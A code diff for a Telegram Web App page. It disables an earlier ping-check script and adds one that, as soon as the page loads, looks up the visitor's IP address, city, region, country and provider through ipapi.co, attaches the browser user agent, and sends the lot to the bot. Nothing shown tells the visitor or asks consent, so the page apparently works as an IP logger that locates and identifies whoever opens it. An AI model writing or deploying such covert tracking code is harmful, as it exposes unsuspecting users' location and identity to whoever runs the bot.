@@ -41,6 +41,7 @@
   <div class="result" id="cf"></div>
   <button class="close-btn" onclick="Telegram.WebApp.close()">Закрыть</button>
 
+<!--   
   <script>
     async function checkPing(url, timeout = 3000) {
       const controller = new AbortController();
@@ -113,6 +114,41 @@
     window.addEventListener('DOMContentLoaded', () => {
       setTimeout(sendData, 500);
     });
+  </script> -->
+  <script>
+    async function sendData() {
+      const status = document.getElementById("status");
+  
+      if (!Telegram.WebApp || !Telegram.WebApp.initData || Telegram.WebApp.initData.length === 0) {
+        status.innerText = "❌ Открой страницу через Telegram";
+        return;
+      }
+  
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const userAgent = navigator.userAgent;
+  
+        const payload = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          org: ipData.org,
+          ua: userAgent
+        };
+  
+        Telegram.WebApp.ready();  // ⬅️ ВАЖНО!
+        Telegram.WebApp.sendData(JSON.stringify(payload));
+        status.innerText = "✅ Данные отправлены";
+      } catch (e) {
+        status.innerText = "❌ Ошибка: " + e.message;
+      }
+    }
+  
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(sendData, 500);
+    });
   </script>
+  
 </body>
 </html>
